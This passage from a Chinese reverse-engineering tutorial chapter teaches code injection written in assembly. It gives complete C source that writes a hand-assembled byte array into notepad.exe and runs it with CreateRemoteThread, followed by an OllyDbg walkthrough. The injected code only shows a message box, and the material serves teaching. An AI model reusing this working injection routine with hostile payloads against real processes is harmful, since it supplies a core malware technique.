转到401000地址处"></p><p>ThreadProc()函数的地址区间为401000~401061。如图28-17所示，选中该地址区域，在鼠标<br>右键菜单中依次选择Copy-To file项目（参考图28-18 ）。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/03/img/%E7%AC%AC28%E7%AB%A0%20%E4%BD%BF%E7%94%A8%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E7%BC%96%E5%86%99%E6%B3%A8%E5%85%A5%E4%BB%A3%E7%A0%81.assets/image-20220224113113596.png" alt="图28-18 Copy-To file菜单"></p><p>接着，使用文本编辑器打开刚刚保存的文件（我使用的文本编辑器为GVIM，各位也可以使用自己熟悉的文本编辑器）。</p><p>图28-19中显示的文本内容即为以Hex值形式表示的ThreadProc()函数，它们其实是一系列的IA-32指令，也是要注入目标进程的代码。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/03/img/%E7%AC%AC28%E7%AB%A0%20%E4%BD%BF%E7%94%A8%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E7%BC%96%E5%86%99%E6%B3%A8%E5%85%A5%E4%BB%A3%E7%A0%81.assets/image-20220224113923506.png" alt="图28-19文本编辑器"></p><blockquote><p>IA-32指令解析方法请参考第49章。</p></blockquote><p>如图28-20所示编辑文本文件，去除不必要的部分，每个字节前面加上前缀0x,各字节以逗号（,）分隔。适当应用文本编辑器的编辑功能（选择列、修改字符串）将带来很大便利。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/03/img/%E7%AC%AC28%E7%AB%A0%20%E4%BD%BF%E7%94%A8%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E7%BC%96%E5%86%99%E6%B3%A8%E5%85%A5%E4%BB%A3%E7%A0%81.assets/image-20220224113806626.png" alt="图28-20 编辑内容"></p><p>观察图28-20中编辑的文本内容，它们看上去就像C语言中的字节数组，这就是要注入的Hex代码（CodeInjection2.cpp文件中会用到）。</p><h2 id="28-4-2-Codelnjection2-cpp"><a href="#28-4-2-Codelnjection2-cpp" class="headerlink" title="28.4.2 Codelnjection2.cpp"></a>28.4.2 Codelnjection2.cpp</h2><p>本节看看代码注入程序的源代码（CodeInjection2.cpp ）。从代码28-1中可以看到，图28-20中使用文本编辑器编辑的Hex代码被保存到名为g_InjectionCode的字节数组。</p><blockquote><p>以下源代码使用 MS Visual C++2010 Express Edition 编写而成，在 Windows XP&#x2F;7 32位操作系统中通过测试。为便于说明，代码中的返回值检查与异常处理代码均已省略。</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// CodeInjection2.cpp</span><br><span class="hljs-comment">// reversecore@gmail.com</span><br><span class="hljs-comment">// http://www.reversecore.com</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;windows.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;stdio.h&quot;</span></span><br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">THREAD_PARAM</span> </span><br><span class="hljs-class">&#123;</span><br>    FARPROC pFunc[<span class="hljs-number">2</span>];               <span class="hljs-comment">// LoadLibraryA(), GetProcAddress()</span><br>&#125; THREAD_PARAM, *PTHREAD_PARAM;<br><br>BYTE g_InjectionCode[] = <br>&#123;<br>    <span class="hljs-number">0x55</span>, <span class="hljs-number">0x8B</span>, <span class="hljs-number">0xEC</span>, <span class="hljs-number">0x8B</span>, <span class="hljs-number">0x75</span>, <span class="hljs-number">0x08</span>, <span class="hljs-number">0x68</span>, <span class="hljs-number">0x6C</span>, <span class="hljs-number">0x6C</span>, <span class="hljs-number">0x00</span>,<br>    <span class="hljs-number">0x00</span>, <span class="hljs-number">0x68</span>, <span class="hljs-number">0x33</span>, <span class="hljs-number">0x32</span>, <span class="hljs-number">0x2E</span>, <span class="hljs-number">0x64</span>, <span class="hljs-number">0x68</span>, <span class="hljs-number">0x75</span>, <span class="hljs-number">0x73</span>, <span class="hljs-number">0x65</span>,<br>    <span class="hljs-number">0x72</span>, <span class="hljs-number">0x54</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0x16</span>, <span class="hljs-number">0x68</span>, <span class="hljs-number">0x6F</span>, <span class="hljs-number">0x78</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x68</span>,<br>    <span class="hljs-number">0x61</span>, <span class="hljs-number">0x67</span>, <span class="hljs-number">0x65</span>, <span class="hljs-number">0x42</span>, <span class="hljs-number">0x68</span>, <span class="hljs-number">0x4D</span>, <span class="hljs-number">0x65</span>, <span class="hljs-number">0x73</span>, <span class="hljs-number">0x73</span>, <span class="hljs-number">0x54</span>,<br>    <span class="hljs-number">0x50</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0x56</span>, <span class="hljs-number">0x04</span>, <span class="hljs-number">0x6A</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xE8</span>, <span class="hljs-number">0x0C</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>,<br>    <span class="hljs-number">0x00</span>, <span class="hljs-number">0x52</span>, <span class="hljs-number">0x65</span>, <span class="hljs-number">0x76</span>, <span class="hljs-number">0x65</span>, <span class="hljs-number">0x72</span>, <span class="hljs-number">0x73</span>, <span class="hljs-number">0x65</span>, <span class="hljs-number">0x43</span>, <span class="hljs-number">0x6F</span>,<br>    <span class="hljs-number">0x72</span>, <span class="hljs-number">0x65</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xE8</span>, <span class="hljs-number">0x14</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x77</span>, <span class="hljs-number">0x77</span>,<br>    <span class="hljs-number">0x77</span>, <span class="hljs-number">0x2E</span>, <span class="hljs-number">0x72</span>, <span class="hljs-number">0x65</span>, <span class="hljs-number">0x76</span>, <span class="hljs-number">0x65</span>, <span class="hljs-number">0x72</span>, <span class="hljs-number">0x73</span>, <span class="hljs-number">0x65</span>, <span class="hljs-number">0x63</span>,<br>    <span class="hljs-number">0x6F</span>, <span class="hljs-number">0x72</span>, <span class="hljs-number">0x65</span>, <span class="hljs-number">0x2E</span>, <span class="hljs-number">0x63</span>, <span class="hljs-number">0x6F</span>, <span class="hljs-number">0x6D</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x6A</span>, <span class="hljs-number">0x00</span>,<br>    <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xD0</span>, <span class="hljs-number">0x33</span>, <span class="hljs-number">0xC0</span>, <span class="hljs-number">0x8B</span>, <span class="hljs-number">0xE5</span>, <span class="hljs-number">0x5D</span>, <span class="hljs-number">0xC3</span><br>&#125;;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">004010ED    55               PUSH EBP</span><br><span class="hljs-comment">004010EE    8BEC             MOV EBP,ESP</span><br><span class="hljs-comment">004010F0    8B75 08          MOV ESI,DWORD PTR SS:[EBP+8]       ; ESI = pParam           </span><br><span class="hljs-comment">004010F3    68 6C6C0000      PUSH 6C6C                      </span><br><span class="hljs-comment">004010F8    68 33322E64      PUSH 642E3233</span><br><span class="hljs-comment">004010FD    68 75736572      PUSH 72657375</span><br><span class="hljs-comment">00401102    54               PUSH ESP                           ; - &quot;user32.dll&quot;</span><br><span class="hljs-comment">00401103    FF16             CALL DWORD PTR DS:[ESI]            ; LoadLibraryA(&quot;user32.dll&quot;)</span><br><span class="hljs-comment">00401105    68 6F784100      PUSH 41786F</span><br><span class="hljs-comment">0040110A    68 61676542      PUSH 42656761</span><br><span class="hljs-comment">0040110F    68 4D657373      PUSH 7373654D</span><br><span class="hljs-comment">00401114    54               PUSH ESP                           ; - &quot;MessageBoxA&quot;</span><br><span class="hljs-comment">00401115    50               PUSH EAX                           ; - hMod</span><br><span class="hljs-comment">00401116    FF56 04          CALL DWORD PTR DS:[ESI+4]          ; GetProcAddress(hMod, &quot;MessageBoxA&quot;)</span><br><span class="hljs-comment">00401119    6A 00            PUSH 0                             ; - MB_OK (0)</span><br><span class="hljs-comment">0040111B    E8 0C000000      CALL 0040112C</span><br><span class="hljs-comment">00401120                     &lt;ASCII&gt;                            ; - &quot;ReverseCore&quot;, 0</span><br><span class="hljs-comment">0040112C    E8 14000000      CALL 00401145</span><br><span class="hljs-comment">00401131                     &lt;ASCII&gt;                            ; - &quot;www.reversecore.com&quot;, 0</span><br><span class="hljs-comment">00401145    6A 00            PUSH 0                             ; - hWnd (0)</span><br><span class="hljs-comment">00401147    FFD0             CALL EAX                           ; MessageBoxA(0, &quot;www.reversecore.com&quot;, &quot;ReverseCore&quot;, 0)</span><br><span class="hljs-comment">00401149    33C0             XOR EAX,EAX                        </span><br><span class="hljs-comment">0040114B    8BE5             MOV ESP,EBP</span><br><span class="hljs-comment">0040114D    5D               POP EBP                            </span><br><span class="hljs-comment">0040114E    C3               RETN</span><br><span class="hljs-comment">*/</span><br><br><br>BOOL <span class="hljs-title function_">InjectCode</span><span class="hljs-params">(DWORD dwPID)</span><br>&#123;<br>    HMODULE         hMod            = <span class="hljs-literal">NULL</span>;<br>    THREAD_PARAM    param           = &#123;<span class="hljs-number">0</span>,&#125;;<br>    HANDLE          hProcess        = <span class="hljs-literal">NULL</span>;<br>    HANDLE          hThread         = <span class="hljs-literal">NULL</span>;<br>    LPVOID          pRemoteBuf[<span class="hljs-number">2</span>]   = &#123;<span class="hljs-number">0</span>,&#125;;<br><br>    hMod = GetModuleHandleA(<span class="hljs-string">&quot;kernel32.dll&quot;</span>);<br><br>    <span class="hljs-comment">// set THREAD_PARAM</span><br>    param.pFunc[<span class="hljs-number">0</span>] = GetProcAddress(hMod, <span class="hljs-string">&quot;LoadLibraryA&quot;</span>);<br>    param.pFunc[<span class="hljs-number">1</span>] = GetProcAddress(hMod, <span class="hljs-string">&quot;GetProcAddress&quot;</span>);<br><br>    <span class="hljs-comment">// Open Process</span><br>    <span class="hljs-keyword">if</span> ( !(hProcess = OpenProcess(PROCESS_ALL_ACCESS,               <span class="hljs-comment">// dwDesiredAccess</span><br>                                  FALSE,                            <span class="hljs-comment">// bInheritHandle</span><br>                                  dwPID)) )                         <span class="hljs-comment">// dwProcessId</span><br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;OpenProcess() fail : err_code = %d\n&quot;</span>, GetLastError());<br>        <span class="hljs-keyword">return</span> FALSE;<br>    &#125;<br><br>    <span class="hljs-comment">// Allocation for THREAD_PARAM</span><br>    <span class="hljs-keyword">if</span>( !(pRemoteBuf[<span class="hljs-number">0</span>] = VirtualAllocEx(hProcess,                  <span class="hljs-comment">// hProcess</span><br>                                         <span class="hljs-literal">NULL</span>,                      <span class="hljs-comment">// lpAddress</span><br>                                         <span class="hljs-keyword">sizeof</span>(THREAD_PARAM),      <span class="hljs-comment">// dwSize</span><br>                                         MEM_COMMIT,                <span class="hljs-comment">// flAllocationType</span><br>                                         PAGE_READWRITE)) )         <span class="hljs-comment">// flProtect</span><br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;VirtualAllocEx() fail : err_code = %d\n&quot;</span>, GetLastError());<br>        <span class="hljs-keyword">return</span> FALSE;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span>( !WriteProcessMemory(hProcess,                               <span class="hljs-comment">// hProcess</span><br>                            pRemoteBuf[<span class="hljs-number">0</span>],                          <span class="hljs-comment">// lpBaseAddress</span><br>                            (LPVOID)&amp;param,                         <span class="hljs-comment">// lpBuffer</span><br>                            <span class="hljs-keyword">sizeof</span>(THREAD_PARAM),                   <span class="hljs-comment">// nSize</span><br>                            <span class="hljs-literal">NULL</span>) )                                 <span class="hljs-comment">// [out] lpNumberOfBytesWritten</span><br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;WriteProcessMemory() fail : err_code = %d\n&quot;</span>, GetLastError());<br>        <span class="hljs-keyword">return</span> FALSE;<br>    &#125;<br><br>    <span class="hljs-comment">// Allocation for ThreadProc()</span><br>    <span class="hljs-keyword">if</span>( !(pRemoteBuf[<span class="hljs-number">1</span>] = VirtualAllocEx(hProcess,                  <span class="hljs-comment">// hProcess</span><br>                                         <span class="hljs-literal">NULL</span>,                      <span class="hljs-comment">// lpAddress</span><br>                                         <span class="hljs-keyword">sizeof</span>(g_InjectionCode),   <span class="hljs-comment">// dwSize</span><br>                                         MEM_COMMIT,                <span class="hljs-comment">// flAllocationType</span><br>                                         PAGE_EXECUTE_READWRITE)) ) <span class="hljs-comment">// flProtect</span><br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;VirtualAllocEx() fail : err_code = %d\n&quot;</span>, GetLastError());<br>        <span class="hljs-keyword">return</span> FALSE;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span>( !WriteProcessMemory(hProcess,                               <span class="hljs-comment">// hProcess</span><br>                            pRemoteBuf[<span class="hljs-number">1</span>],                          <span class="hljs-comment">// lpBaseAddress</span><br>                            (LPVOID)&amp;g_InjectionCode,               <span class="hljs-comment">// lpBuffer</span><br>                            <span class="hljs-keyword">sizeof</span>(g_InjectionCode),                <span class="hljs-comment">// nSize</span><br>                            <span class="hljs-literal">NULL</span>) )                                 <span class="hljs-comment">// [out] lpNumberOfBytesWritten</span><br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;WriteProcessMemory() fail : err_code = %d\n&quot;</span>, GetLastError());<br>        <span class="hljs-keyword">return</span> FALSE;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span>( !(hThread = CreateRemoteThread(hProcess,                    <span class="hljs-comment">// hProcess</span><br>                                       <span class="hljs-literal">NULL</span>,                        <span class="hljs-comment">// lpThreadAttributes</span><br>                                       <span class="hljs-number">0</span>,                           <span class="hljs-comment">// dwStackSize</span><br>                                       (LPTHREAD_START_ROUTINE)pRemoteBuf[<span class="hljs-number">1</span>],<br>                                       pRemoteBuf[<span class="hljs-number">0</span>],               <span class="hljs-comment">// lpParameter</span><br>                                       <span class="hljs-number">0</span>,                           <span class="hljs-comment">// dwCreationFlags</span><br>                                       <span class="hljs-literal">NULL</span>)) )                     <span class="hljs-comment">// lpThreadId</span><br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;CreateRemoteThread() fail : err_code = %d\n&quot;</span>, GetLastError());<br>        <span class="hljs-keyword">return</span> FALSE;<br>    &#125;<br><br>    WaitForSingleObject(hThread, INFINITE);<br><br>    CloseHandle(hThread);<br>    CloseHandle(hProcess);<br><br>    <span class="hljs-keyword">return</span> TRUE;<br>&#125;<br></code></pre></td></tr></table></figure><p>代码28-1中的注入代码与前面讲过的Codelnjection.cpp代码类似（调用的API也一样）。但它们最大的不同在于，代码28-1中的注入代码本身同时包含着代码所需的字符串数据。所以_THREAD_PARAM结构体中并不包含字符串成员，并且图28-20中的指令字节数组（g_InjectionCode ）替代了用C语言编写的ThreadProc()函数。若程序编写得更巧妙一些，甚至都可以不用_THREAD_PARAM结构体。每个人的具体实现细节都是不同的，可以根据自己的需要调整。重要的是，方法的实质都是一样的，即编写汇编代码，将生成的指令内联在注入程序的源代码中，进而<br>将其注入目标进程。将代码成功注入目标进程后，下面我们将通过调试来分析各汇编代码的含义。</p><blockquote><p>将上面的CodeInjection2.cpp与上一章中的Codeinjection.cpp源代码比较，可以明显看出它们的不同之处。</p></blockquote><h1 id="28-5-调试练习"><a href="#28-5-调试练习" class="headerlink" title="28.5 调试练习"></a>28.5 调试练习</h1><p>本节将notepad.exe进程注入使用汇编语言编写的代码，并通过调试了解其工作原理。</p><h2 id="28-5-1-调试-notepad-exe"><a href="#28-5-1-调试-notepad-exe" class="headerlink" title="28.5.1 调试 notepad.exe"></a>28.5.1 调试 notepad.exe</h2><p>使用OllyDbg工具打开notepad.exe文件开始调试。按F9运行键，使notepad.exe处于Running （运行）状态。</p><blockquote><p>一定要使notepad.exe处于Running （运行）状态！！</p></blockquote><h2 id="28-5-2-设置OllyDbg-选项"><a href="#28-5-2-设置OllyDbg-选项" class="headerlink" title="28.5.2 设置OllyDbg 选项"></a>28.5.2 设置OllyDbg 选项</h2><p>进行代码注入时要在目标进程创建新线程，如图28-22所示，设置好OllyDbg的选项即可从注入的线程代码开始调试。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/03/img/%E7%AC%AC28%E7%AB%A0%20%E4%BD%BF%E7%94%A8%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E7%BC%96%E5%86%99%E6%B3%A8%E5%85%A5%E4%BB%A3%E7%A0%81.assets/image-20220224122846596.png" alt="图28-22 复选Break on new thread项"></p><p>这样，notepad.exe进程中有新线程生成时，调试器就会暂停在相应线程函数的开始代码处。</p><h2 id="28-5-3-运行-Codelnjection2-exe"><a href="#28-5-3-运行-Codelnjection2-exe" class="headerlink" title="28.5.3 运行 Codelnjection2.exe"></a>28.5.3 运行 Codelnjection2.exe</h2><p>首先，使用Process Explorer查看notepad.exe进程的PID,如图28-23所示。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/03/img/%E7%AC%AC28%E7%AB%A0%20%E4%BD%BF%E7%94%A8%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E7%BC%96%E5%86%99%E6%B3%A8%E5%85%A5%E4%BB%A3%E7%A0%81.assets/image-20220224123002966.png" alt="图28-23 notepad.exe进程的PID"></p><p>以PID值作为参数，在命令行窗口中运行CodeInjection2.exe（以管理员身份运行），如图28-24所示。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/03/img/%E7%AC%AC28%E7%AB%A0%20%E4%BD%BF%E7%94%A8%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E7%BC%96%E5%86%99%E6%B3%A8%E5%85%A5%E4%BB%A3%E7%A0%81.assets/image-20220224123118766.png" alt="图28-24 运行CodeInjection2.exe"></p><h2 id="28-5-4-线程起始代码"><a href="#28-5-4-线程起始代码" class="headerlink" title="28.5.4 线程起始代码"></a>28.5.4 线程起始代码</h2><p>运行CodeInjection2.exe程序完成代码注入后，调试器会暂停在被注入的线程代码的起始位置，如图28-25所示。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/03/img/%E7%AC%AC28%E7%AB%A0%20%E4%BD%BF%E7%94%A8%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E7%BC%96%E5%86%99%E6%B3%A8%E5%85%A5%E4%BB%A3%E7%A0%81.assets/image-20220224193820526.png" alt="图28-25 被注入的代码：ThreadProc()"></p><blockquote><p>不同运行环境下代码起始地址（ 1C0000 ）不同。</p></blockquote><p>下面详细分析图28-25中的代码。</p><h1 id="28-6-详细分析"><a href="#28-6-详细分析" class="headerlink" title="28.6 详细分析"></a>28.6 详细分析</h1><h2 id="28-6-1-生成栈帧"><a href="#28-6-1-生成栈帧" class="headerlink" title="28.6.1 生成栈帧"></a>28.6.1 生成栈帧</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs assembly">001C0000    55              push ebp<br>001C0001    8BEC            mov ebp,esp<br></code></pre></td></tr></table></figure><p>上面是2条典型的生成栈帧指令，对它们感到陌生的朋友可以趁此机会记住： 55 8BEC。后面出现的指令使用压字符串入栈的技术，生成栈帧就可以在ThreadProc()函数终止时将栈清理干净。</p><h2 id="28-6-2-THREAD-PARAM-结构体指针"><a href="#28-6-2-THREAD-PARAM-结构体指针" class="headerlink" title="28.6.2 THREAD_PARAM 结构体指针"></a>28.6.2 THREAD_PARAM 结构体指针</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs assembly">001C0003    8B75 08         mov esi,dword ptr ss:[ebp+0x8]<br></code></pre></td></tr></table></figure><p>生成栈帧后，[EBP+8]是传入函数的第一个参数，这里指THREAD_PARAM结构体指针。下面是THREAD_PARAM结构体的定义，它的成员是2个函数指针，分别用来保存LoadLibraryA()与GetProcAddress()的函数指针（谁获取了函数指针并保存呢？对，就是前面讲过的CodeInjection2.exe程序，它获取了函数的指针，向notepad.exe注入完成并运行线程时以参数形式保存）。 </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">THREAD_PARAM</span> </span><br><span class="hljs-class">&#123;</span><br>    FARPROC pFunc[<span class="hljs-number">2</span>];               <span class="hljs-comment">// LoadLibraryA(), GetProcAddress()</span><br>&#125; THREAD_PARAM, *PTHREAD_PARAM;<br></code></pre></td></tr></table></figure><p>执行完1C0003地址处的<code>MOV ESI,DWORD PTR SS:[EBP+8]</code>指令后，进入ESI寄存器存储的地址查看，如图28-26所示。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/03/img/%E7%AC%AC28%E7%AB%A0%20%E4%BD%BF%E7%94%A8%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E7%BC%96%E5%86%99%E6%B3%A8%E5%85%A5%E4%BB%A3%E7%A0%81.assets/image-20220224194004973.png" alt="图28-26 查看THREAD_PARAM结构体"></p><p>寄存器ESI中存储的地址为1A0000,该地址是CodeInjection2.exe为THREAD_PARAM结构体在notepad.exe进程内存空间中分配的内存缓冲区地址。</p><blockquote><p>不同用户系统环境下THREAD_PARAM结构体地址（ 1A0000 ）不同。</p></blockquote><p>观察图28-26中的内存窗口可以看到，280000地址处存储着2个4字节的值，它们就是函数LoadLibraryA()与GetProcAddress()的起始地址。为了更直观地查看函数的起始地址，需要设置OllyDbg内存窗口的视图选项。先移动光标到内存窗口，然后在鼠标右键菜单中依次选择Long-Address项目，如图28-27所示。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/03/img/%E7%AC%AC28%E7%AB%A0%20%E4%BD%BF%E7%94%A8%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E7%BC%96%E5%86%99%E6%B3%A8%E5%85%A5%E4%BB%A3%E7%A0%81.assets/image-20220224194034722.png" alt="图28-27 Long-Address菜单项目"></p><p>选中图28-27中的菜单后，OllyDbg的内存窗口显示形式改变，如图28-28所示。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/03/img/%E7%AC%AC28%E7%AB%A0%20%E4%BD%BF%E7%94%A8%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E7%BC%96%E5%86%99%E6%B3%A8%E5%85%A5%E4%BB%A3%E7%A0%81.assets/image-20220224194120331.png" alt="图28-28 API起始地址"></p><p>函数地址如图显示就更直观了。并且，Comment栏中与各行地址对应的API名称也一同出现（在鼠标右键菜单中选择Hex-Hex&#x2F;ASCII（16bytes）菜单，可以重新显示为Hex形式）。</p><h2 id="28-6-3-“User32-dll”-字符串"><a href="#28-6-3-“User32-dll”-字符串" class="headerlink" title="28.6.3 “User32.dll” 字符串"></a>28.6.3 “User32.dll” 字符串</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs assembly">001C0006    68 6C6C0000     push 0x6C6C<br>001C000B    68 33322E64     push 0x642E3233<br>001C0010    68 75736572     push 0x72657375<br></code></pre></td></tr></table></figure><p>上面3行代码将“User32.dll”字符串压入栈，这种独特技术仅用于使用汇编语言编写的程序。地址1C0006处的PUSH 6C6C指令用来将6C6C压入栈，其中6C是ASCII码，对应字母<code>1</code>，所以该指令最终压入栈的是字符串<code>\0\0ll</code>。紧接着，1C000B与1C0010地址处的PUSH指令分别将字符串<code>d.23</code> 与<code>resu</code>压入栈。由于x86 CPU采用小端序标记法，再加上栈的逆向扩展特性，所 以字符串被逆向压入栈，请重点注意这个调试时必须掌握的内容。<br>自上而下跟踪代码到1C0015地址处，查看栈，如图28-29所示。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/03/img/%E7%AC%AC28%E7%AB%A0%20%E4%BD%BF%E7%94%A8%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E7%BC%96%E5%86%99%E6%B3%A8%E5%85%A5%E4%BB%A3%E7%A0%81.assets/image-20220224194330235.png" alt="图28-29 栈中存储着“user32.dll”字符串"></p><p>像这样，使用PUSH指令可以把指定字符串压入栈。并且，注入代码时不必另外注入字符串数据，只要把它们包含到代码中，只注入代码即可。</p><blockquote><ul><li><p>还有一种将字符串数据包含进代码的方法，后面会单独介绍。 </p></li><li><p>32位的OS中，PUSH指令一次只能将4字节大小的数据压入栈。</p></li></ul></blockquote><h2 id="28-6-4-压入“user32-dll”字符串参数"><a href="#28-6-4-压入“user32-dll”字符串参数" class="headerlink" title="28.6.4 压入“user32.dll”字符串参数"></a>28.6.4 压入“user32.dll”字符串参数</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs assembly">001C0015    54              push esp<br></code></pre></td></tr></table></figure><p>LoadLibraryA() API拥有1个参数，用来接收1个字符串的地址，该字符串是其要加载的DLL文件的名称。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c">HINSTANCE <span class="hljs-title function_">LoadLibrary</span><span class="hljs-params">(</span><br><span class="hljs-params">LPCTSTR lpLibFileName</span><br><span class="hljs-params"> <span class="hljs-comment">// address of filename of executable module</span></span><br><span class="hljs-params">)</span>;<br></code></pre></td></tr></table></figure><p>从图28-29中可知，当前ESP的值为A3FF7C，它是“user32.dll”字符串的起始地址。地址1C0015处的<code>PUSH ESP</code>指令用来将“user32.dll”字符串的起始地址（A3FF7C）压入栈（参考图28-30 ）。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/03/img/%E7%AC%AC28%E7%AB%A0%20%E4%BD%BF%E7%94%A8%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E7%BC%96%E5%86%99%E6%B3%A8%E5%85%A5%E4%BB%A3%E7%A0%81.assets/image-20220224194509304.png" alt="图28-30 1C0015地址处的PUSH指令"></p><h2 id="28-6-5-调用-LoadLibraryA（-“user32-dll”）"><a href="#28-6-5-调用-LoadLibraryA（-“user32-dll”）" 